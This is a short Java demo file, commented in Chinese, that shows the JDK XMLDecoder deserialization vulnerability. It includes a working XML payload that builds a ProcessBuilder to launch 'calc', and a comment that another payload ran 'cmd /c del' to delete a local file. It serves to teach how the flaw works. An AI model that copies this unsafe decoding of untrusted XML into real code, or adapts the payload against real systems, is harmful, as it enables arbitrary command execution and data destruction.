package com.allst.jcore.java;

import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;

/**
 * jdk中的XMLDecoder反序列化的漏洞
 * @author June
 * @since 2018-01-01
 */
public class JDKDeserialize {

	public static void main(String[] args) {
		byXmlFile();
//		byXmlLocal();
	}
	
	/**
	 * 直接删除了本地的e:\1.txt文件，相当于在命令行调用了cmd /c del e:\1.txt命令，
	 * 直接完全删除了本地文件，相当恐怖！
	 */
	private static void byXmlFile() {
		File file = new File("E:/TestData/xmldencoder.xml");
		if (!file.exists()) {
			System.out.println("文件不存在...");
		}
		XMLDecoder xd = null;
		try {
			xd = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
		} catch (Exception e) {
			e.printStackTrace();
		}
		Object obj = xd.readObject();
		xd.close();
	}
	
	/**
	 * 利用xml调用本地程序
	 */
	@SuppressWarnings("unused")
	private static void byXmlLocal() {
		String xml = new StringBuilder()
				.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
				.append("<java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\">")
				.append("<object class=\"java.lang.ProcessBuilder\">")
				.append("<array class=\"java.lang.String\" length=\"1\">")
				.append("<void index=\"0\">")
				.append("<string>calc</string></void>")
				.append("</array>")
				.append("<void method=\"start\" />")
				.append("</object>")
				.append("</java>").toString();
		XMLDecoder xd = null;
		try {
			xd = new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));
		} catch (Exception e) {
			e.printStackTrace();
		}
		Object obj = xd.readObject();
		xd.close();
	}
}
